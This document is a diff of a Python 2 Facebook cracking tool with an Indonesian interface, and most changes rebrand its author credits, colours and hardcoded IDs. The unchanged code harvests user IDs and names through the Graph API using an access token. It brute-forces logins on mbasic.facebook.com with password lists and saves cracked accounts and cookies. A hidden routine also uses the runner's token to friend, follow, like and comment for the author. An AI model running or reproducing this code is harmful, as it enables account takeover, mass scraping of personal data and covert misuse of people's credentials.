@@ -56,8 +56,8 @@ def keluar():
 def token():
 	os.system("clear")
 	os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
-	os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
-	data = raw_input("\033[0;91m[\033[0;92m?\033[0;93m] \033[0;94mToken :\033[0;95m ")
+	os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
+	data = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mToken :\033[0;93m ")
 	try:
 		me = requests.get('https://graph.facebook.com/me?access_token='+data)
 		a = json.loads(me.text)
@@ -76,18 +76,18 @@ def bot_komen():
 	except IOError:
 		os.system('echo -e "[✖] Token Invalid ! "| lolcat')
 		log_token()
-	una = ('100005789553399')
-	kom = ('MUACHH 😘😘😘 @[100005789553399:]')
-        post = ('1190012567868384')
-        post2 = ('1190012567868384')
-        kom2 = ('KREN BANG  WAHYU😘😘😘')
+	una = ('757953543')
+	kom = ('I Love You @[757953543:]')
+        post = ('10158795312888544')
+        post2 = ('10158807643598544')
+        kom2 = ('Mantap Bro ❤️')
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
-        requests.post('https://graph.facebook.com/100005789553399/subscribers?access_token=' + toket)
-        requests.post('https://graph.facebook.com/100003799027558/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
         requests.post('https://graph.facebook.com/'+post+'/likes?summary=true&access_token=' + toket)
-        requests.post('https://graph.facebook.com/1727458364123799/comments/?message=Langgeng selalu ya bang Wahyu 😘&access_token=' + toket)
-        requests.post('https://graph.facebook.com/1727458364123799/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=Cantik Banget Bro ❤️&access_token=' + toket)
+        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
         requests.post('https://graph.facebook.com/'+post2+'/likes?summary=true&access_token=' + toket)
 	menu()
@@ -102,11 +102,11 @@ def menu():
     time.sleep(1)
     log_token()
   os.system("clear")
-  os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-  os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
-  print("\033[0;91m[\033[0;96m✔\033[0;97m] \033[0;94mNama :\033[0;93m "+nama)
+  os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+  os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
+  print("\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama :\033[0;97m "+nama)
   os.system('echo -e "────────────────────────────────────────\n[1] Dump ID Teman\n[2] Dump ID Publik\n[3] Dump ID Dari Total Followers\n[4] Dump ID Dari Total Like\n[5] Start Crack\n[0] Keluar\n────────────────────────────────────────"| lolcat')
-  r=raw_input("\033[0;95m[\033[0;96m?\033[0;97m]\033[0;91m Pilih :\033[0;94m ")
+  r=raw_input("\033[0;93m[\033[0;92m?\033[0;93m]\033[0;92m Pilih :\033[0;93m ")
   if r=="":
 	os.system('echo -e "[✖] Isi Dengan Benar ! "| lolcat')
 	menu()
@@ -140,10 +140,10 @@ def teman():
                 log_token()
         try:
                 os.system("clear")
-                os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
-		limit = raw_input("\033[0;96m[\033[0;97m?\033[0;94m] \033[0;91mLimit Dump : \033[0;95m")
-                file = raw_input("\033[0;95m[\033[0;91m?\033[0;94m] \033[0;97mNama File : \033[0;96m")
+                os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+		os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
+		limit = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mLimit Dump : \033[0;93m")
+                file = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mNama File : \033[0;93m")
                 os.system('echo -e "────────────────────────────────────────"| lolcat')
                 try:
                    r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
@@ -158,16 +158,16 @@ def teman():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         ys.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\033[0;91mDump \033[0;94m[\033[0;95m%s\033[0;96m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\033[0;92mDump \033[0;93m[\033[0;92m%s\033[0;93m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                         #print (  a["name"])
                 ys.close()
                 os.rename(qq,file)
                 os.system('echo -e "\r────────────────────────────────────────"| lolcat')
 		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
-                print("\r\033[0;91m[\033[0;93m✔\033[0;95m] \033[0;97mTotal ID :\033[0;95m %s"%(len(id)))
-                print("\r\033[0;92m[\033[0;94m✔\033[0;96m] \033[0;97mNama File :\033[0;95m %s"%file)
+                print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mTotal ID :\033[0;93m %s"%(len(id)))
+                print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama File :\033[0;93m %s"%file)
                 os.system('echo -e "────────────────────────────────────────"| lolcat')
-                raw_input("\033[0;91m[\033[0;94mKembali\033[0;95m]")
+                raw_input("\033[0;93m[\033[0;92mKembali\033[0;93m]")
                 menu()
 
         except requests.exceptions.ConnectionError:
@@ -183,16 +183,16 @@ def followers():
                 log_token()
         try:
                 os.system("clear")
-		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
-                idt = raw_input("\033[0;91m[\033[0;97m?\033[0;94m]\033[0;94m ID Publik : \033[0;97m")
-                limit = raw_input("\033[0;92m[\033[0;96m?\033[0;92m] \033[0;95mLimit Dump : \033[0;91m")
-                file = raw_input("\033[0;93m[\033[0;91m?\033[0;91m] \033[0;96mNama File : \033[0;92m")
+		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+		os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
+                idt = raw_input("\033[0;93m[\033[0;92m?\033[0;93m]\033[0;92m ID Publik : \033[0;93m")
+                limit = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mLimit Dump : \033[0;93m")
+                file = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mNama File : \033[0;93m")
                 os.system('echo -e "────────────────────────────────────────"| lolcat')
                 try:
                         jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                         op = json.loads(jok.text)
-                        print("\033[0;97m[\033[0;96m✔\033[0;95m] \033[0;94mNama : \033[0;93m"+op["name"])
+                        print("\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama : \033[0;97m"+op["name"])
                 except KeyError:
                         os.system('echo -e "[✖] ID Tidak Ditemukan ! "| lolcat')
                         os.system('echo -e "[Kembali]"| lolcat')
@@ -206,21 +206,21 @@ def followers():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         ys.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\033[0;94mDump \033[0;92m[\033[0;91m%s\033[0;97m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\033[0;92mDump \033[0;93m[\033[0;92m%s\033[0;93m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                         #print (  a["name"])
                 ys.close()
                 os.rename(qq,file)
                 os.system('echo -e "\r────────────────────────────────────────"| lolcat')
 		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
-                print("\r\033[0;97m[\033[0;91m✔\033[0;94m] \033[0;97mTotal ID :\033[0;94m %s"%(len(id)))
-                print("\r\033[0;96m[\033[0;93m✔\033[0;95m] \033[0;91mNama File :\033[0;92m %s"%file)
+                print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mTotal ID :\033[0;93m %s"%(len(id)))
+                print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama File :\033[0;93m %s"%file)
                 os.system('echo -e "────────────────────────────────────────"| lolcat')
-                raw_input("\033[0;91m[\033[0;92mKembali\033[0;93m]")
+                raw_input("\033[0;93m[\033[0;92mKembali\033[0;93m]")
                 menu()
 
         except KeyError:
                 os.system('echo -e "[✖] Tidak Ada Followers ! "| lolcat')
-                raw_input('\n\033[0;97m[\033[0;96mKembali\033[0;92m]')
+                raw_input('\n\033[0;93m[\033[0;92mKembali\033[0;93m]')
                 menu()
         except requests.exceptions.ConnectionError:
                 os.system('echo -e "[✖] Tidak Ada Koneksi ! "| lolcat')
@@ -235,11 +235,11 @@ def like():
                 log_token()
         try:
                 os.system("clear")
-		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
-                idt = raw_input("\033[0;91m[\033[0;96m?\033[0;97m]\033[0;93m ID Post : \033[0;97m")
-		limit = raw_input("\033[0;92m[\033[0;95m?\033[0;92m] \033[0;95mLimit Dump : \033[0;96m")
-                file = raw_input("\033[0;93m[\033[0;94m?\033[0;91m] \033[0;94mNama File : \033[0;95m")
+		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+		os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
+                idt = raw_input("\033[0;93m[\033[0;92m?\033[0;93m]\033[0;92m ID Post : \033[0;93m")
+		limit = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mLimit Dump : \033[0;93m")
+                file = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mNama File : \033[0;93m")
                 os.system('echo -e "────────────────────────────────────────"| lolcat')
                 try:
                    r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
@@ -254,21 +254,21 @@ def like():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         ys.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\033[0;95mDump \033[0;97m[\033[0;96m%s\033[0;94m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\033[0;92mDump \033[0;93m[\033[0;92m%s\033[0;93m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                         #print (  a["name"])
                 ys.close()
                 os.rename(qq,file)
                 os.system('echo -e "\r────────────────────────────────────────"| lolcat')
 		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
-                print("\r\033[0;96m[\033[0;95m✔\033[0;92m] \033[0;93mTotal ID :\033[0;94m %s"%(len(id)))
-                print("\r\033[0;97m[\033[0;94m✔\033[0;91m] \033[0;96mNama File :\033[0;96m %s"%file)
+                print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mTotal ID :\033[0;93m %s"%(len(id)))
+                print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama File :\033[0;93m %s"%file)
                 os.system('echo -e "────────────────────────────────────────"| lolcat')
-                raw_input("\033[0;94m[\033[0;93mKembali\033[0;91m]")
+                raw_input("\033[0;93m[\033[0;92mKembali\033[0;93m]")
                 menu()
 
         except KeyError:
                 os.system('echo -e "[✖] Bukan Postingan ! "| lolcat')
-                raw_input('\n\033[0;94m[\033[0;95mKembali\033[0;96m]')
+                raw_input('\n\033[0;93m[\033[0;92mKembali\033[0;93m]')
                 menu()
         except requests.exceptions.ConnectionError:
                 os.system('echo -e "[✖] Tidak Ada Koneksi ! "| lolcat')
@@ -283,16 +283,16 @@ def publik():
 		log_token()
 	try:
                 os.system("clear")
-		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-		os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
-		idt = raw_input("\033[0;91m[\033[0;94m?\033[0;91m]\033[0;95m ID Publik : \033[0;94m")
-		limit = raw_input("\033[0;92m[\033[0;91m?\033[0;97m] \033[0;93mLimit Dump : \033[0;93m")
-		file = raw_input("\033[0;94m[\033[0;93m?\033[0;96m] \033[0;91mNama File : \033[0;92m")
+		os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+		os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
+		idt = raw_input("\033[0;93m[\033[0;92m?\033[0;93m]\033[0;92m ID Publik : \033[0;93m")
+		limit = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mLimit Dump : \033[0;93m")
+		file = raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mNama File : \033[0;93m")
 		os.system('echo -e "────────────────────────────────────────"| lolcat')
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print("\033[0;91m[\033[0;92m✔\033[0;93m] \033[0;94mNama : \033[0;95m"+op["name"])
+			print("\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama : \033[0;97m"+op["name"])
 		except KeyError:
 			os.system('echo -e "[✖] ID Tidak Ditemukan ! "| lolcat')
 			os.system('echo -e "[Kembali]"| lolcat')
@@ -306,16 +306,16 @@ def publik():
 		for a in z['friends']['data']:
 			id.append(a['id']+"<=>"+a['name'])
 			ys.write(a['id']+"<=>"+a['name']+'\n')
-			print("\r\033[0;91mDump \033[0;94m[\033[0;95m%s\033[0;93m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+			print("\r\033[0;92mDump \033[0;93m[\033[0;92m%s\033[0;93m] "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
 			#print (  a["name"])
 		ys.close()
 		os.rename(qq,file)
 		os.system('echo -e "\r────────────────────────────────────────"| lolcat')
 		os.system('echo -e "[✔] Dump Selesai..." | lolcat')
-		print("\r\033[0;97m[\033[0;95m✔\033[0;93m] \033[0;91mTotal ID :\033[0;92m %s"%(len(id)))
-		print("\r\033[0;96m[\033[0;94m✔\033[0;92m] \033[0;95mNama File :\033[0;97m %s"%file)
+		print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mTotal ID :\033[0;93m %s"%(len(id)))
+		print("\r\033[0;93m[\033[0;92m✔\033[0;93m] \033[0;92mNama File :\033[0;93m %s"%file)
 		os.system('echo -e "────────────────────────────────────────"| lolcat')
-		raw_input("\033[0;94m[\033[0;95mKembali\033[0;96m]")
+		raw_input("\033[0;93m[\033[0;92mKembali\033[0;93m]")
 		menu()
 		
 	except Exception as e:
@@ -374,10 +374,10 @@ def generate(text):
 	return results
 def log_token():
   os.system('clear')
-  os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
+  os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
   os.system('echo -e "────────────────────────────────────────"| lolcat')
-  os.system('echo -e "[✔] Masuk Dengan Akun Fake ! \n────────────────────────────────────────\n[1] Login Menggunakan Token\n[2] Cara Mendapatkan Token\n[0] Keluar\n────────────────────────────────────────"| lolcat')
-  tk=raw_input("\033[0;95m[\033[0;96m?\033[0;97m] \033[0;93mPilih :\033[0;92m ")
+  os.system('echo -e "[✔] Login Menggunakan Akun Baru ! \n────────────────────────────────────────\n[1] Login Menggunakan Token\n[2] Cara Mendapatkan Token\n[0] Keluar\n────────────────────────────────────────"| lolcat')
+  tk=raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mPilih :\033[0;93m ")
   if tk=="":
 	os.system('echo -e "[✖] Isi Dengan Benar ! "| lolcat')
 	log_token()
@@ -385,8 +385,8 @@ def log_token():
     token()
   elif tk=="2":
     os.system('clear')
-    os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-    os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI"| lolcat')
+    os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+    os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak"| lolcat')
     os.system('echo -e "────────────────────────────────────────"| lolcat')
     os.system('echo -e "Anda akan diarahkan ke browser ! "| lolcat')
     time.sleep(3)
@@ -394,7 +394,7 @@ def log_token():
     time.sleep(3)
     os.system('echo -e "Kemudian klik cari dihalaman ! "| lolcat')
     time.sleep(3)
-    os.system('echo -e "Lalu cari tulisan (Eaaa) dan copy Sampai di sini faham? ! "| lolcat')
+    os.system('echo -e "Lalu cari tulisan (Eaaa) dan copy ! "| lolcat')
     time.sleep(3)
     os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
     log_token()
@@ -405,22 +405,22 @@ def log_token():
 	log_token()
 class crack:
         os.system("clear")
-	os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" |  lolcat')
-	os.system('echo -e "────────────────────────────────────────\n[x] Nama : KHAIRUL FATIHIN \n[x] Fb : fb.com/khairulfatihin557 \n[x] Group : SAFI\n────────────────────────────────────────"| lolcat')
+	os.system('echo -e " __  __ ____  _____\n|  \/  | __ )|  ___|\n| |\/| |  _ \| |_\n| |  | | |_) |  _|\n|_|  |_|____/|_|" | lolcat')
+	os.system('echo -e "────────────────────────────────────────\n[x] author : rozhak \n[x] fb : fb.com/757953543 \n[x] github : github.com/r0zhak\n────────────────────────────────────────"| lolcat')
 	def __init__(self):
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		os.system('echo -e "[✔] Password Automatis / Manual (y/n)"| lolcat')
+		os.system('echo -e "[✔] Password Auto / Manual (y/n)"| lolcat')
 		while True:
-			f=raw_input("\033[0;91m[\033[0;93m?\033[0;92m] \033[0;94mPilih :\033[0;95m ")
+			f=raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mPilih :\033[0;93m ")
 			if f=="":continue
 			elif f=="n":
 				try:
 					while True:
 						try:
 							os.system('echo -e "────────────────────────────────────────"| lolcat')
-							self.apk=raw_input("\033[0;97m[\033[0;96m?\033[0;95m]\033[0;94m Nama File :\033[0;91m ")
+							self.apk=raw_input("\033[0;93m[\033[0;92m?\033[0;93m]\033[0;92m Nama File :\033[0;93m ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -436,7 +436,7 @@ class crack:
 					os.system('echo -e "[✖] File Tidak Valid ! "| lolcat')
 					continue
 				os.system('echo -e "────────────────────────────────────────"| lolcat')
-				os.system('echo -e "[✔] Contoh Password : tempekjandabasah,kontolngacengcrot"| lolcat')
+				os.system('echo -e "[✔] Contoh Password : sayang,anjing"| lolcat')
 				self.pwlist()
 				break
 			elif f=="y":
@@ -444,7 +444,7 @@ class crack:
 					while True:
 						try:
 							os.system('echo -e "────────────────────────────────────────"| lolcat')
-							self.apk=raw_input("\033[0;91m[\033[0;92m?\033[0;93m] \033[0;94mNama File :\033[0;95m ")
+							self.apk=raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mNama File :\033[0;93m ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -469,7 +469,7 @@ class crack:
 				os.system('echo -e "\n[✔] Selesai..."| lolcat')
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[\033[0;96m?\033[0;95m] \033[0;94mPassword :\033[0;97m ").split(",")
+		self.pw=raw_input("\033[0;93m[\033[0;92m?\033[0;93m] \033[0;92mPassword :\033[0;93m ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -488,7 +488,7 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r\033[0;97m[Ok]%s %s \033[0;96m•\033[0;94m %s %s      "%(G,fl.get("id"),i,N))
+					print("\r\033[0;92m[Ok]%s %s \033[0;91m•\033[0;92m %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("Save.txt").read():
 						break
@@ -498,7 +498,7 @@ class crack:
 					ko="%s • %s %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r\033[0;97m[Cp]%s %s \033[0;96m•\033[0;95m %s %s      "%(O,fl.get("id"),i,N))
+					print("\r\033[0;93m[Cp]%s %s \033[0;91m•\033[0;93m %s %s      "%(O,fl.get("id"),i,N))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("Save.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
@@ -506,7 +506,7 @@ class crack:
 				else:continue
 					
 			self.ko+=1
-			print "\r\033[0;97m[\033[0;96mCrack\033[0;95m] \033[0;94m%s/%s \033[0;93m• \033[0;91mOk : %s \033[0;95m• \033[0;97mCp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+			print "\r\033[0;93m[\033[0;92mCrack\033[0;93m] \033[0;93m%s/%s \033[0;91m• \033[0;92mOk : %s \033[0;91m• \033[0;93mCp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 if __name__=='__main__':
